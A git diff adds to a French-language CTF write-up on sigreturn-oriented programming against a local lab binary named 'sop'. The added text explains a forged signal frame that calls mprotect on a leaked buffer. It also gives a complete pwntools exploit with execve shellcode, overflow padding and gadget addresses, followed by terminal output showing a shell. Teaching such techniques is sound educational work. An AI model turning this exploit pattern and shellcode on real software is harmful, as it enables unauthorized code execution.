@@ -190,7 +190,7 @@ Passons au chose serieux ! Il faut rendre l'addresse de buffer executable, pour 
 
 ```python
 trame = SigreturnFrame(kernel="amd64") 
-trame.rax = 10 # 
+trame.rax = 10 
 trame.rdi = leak
 trame.rsi = 2000
 trame.rdx = 7
@@ -200,6 +200,67 @@ trame.rip = syscall
 
 Maintenant que vous êtes tous en mode "Hein ? C koi ça ? " (fin à part sui vous êtes là juste pour verifier que je raconte pas de la merde et que vous maitriser dejas la technique )
 
+première ligne on crée une "fausse" trame de signal, 
+on met rax à 10 qui est le nombre du syscall de MPROTECT,
+on met l'addresse de leak dans rdi, c'est là qu'on met l'addresse qui va être rendu executable,
+et enfin dans rip on met l'addresse de syscall evidament on va donc executer mprotect avec se qu'on a mis dans nos different registre (on va pas s'attarder sur ça, voici la [page manuel de mprotect](http://man7.org/linux/man-pages/man2/mprotect.2.html))
+
+On rajoute donc tout ça dans notre payload:
+```python 
+payload += str(trame)
+payload += p64(leak)
+```
+on saute sur leak qui contient notre shellcode et voila notre shell !
+[!like a boss](https://media2.giphy.com/media/sGpHE1wS1PFWo/source.gif)
+
+Exploit final :
+```python
+from pwn import *
+
+p = process("./sop")
+
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+sigreturn_num_rax = 0x0000000000400614
+syscall = 0x000000000040060a 
+
+pad = 120
+
+p.recvuntil("0x")
+leak = int(p.recvuntil(".")[:-1], 16)
+log.info("Leak: " + str(hex(leak)))
+
+payload = "A"*pad
+payload += p64(sigreturn_num_rax)
+payload += p64(syscall)
+
+trame = SigreturnFrame(kernel="amd64") 
+trame.rax = 10 
+trame.rdi = leak
+trame.rsi = 2000
+trame.rdx = 7
+trame.rsp = leak + len(payload) + 248
+trame.rip = syscall
+
+payload += str(trame)
+payload += p64(leak)
+
+p.sendline(payload)
+p.interactive()
+```
+
+Ahaha ! Aller à la prochaine !
+
+```
+quasar@pwn:~/Bureau/pwn$ sh
+$ ls
+core  exploit.py  pad  sop  sop.c  Untitled-1
+$ id
+uid=1000(quasar) gid=1000(quasar) groupes=1000(quasar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ 
+```
+
+Bon nos droits ne change pas mais on avais pas donné de droit au binaire :)
 
 
 
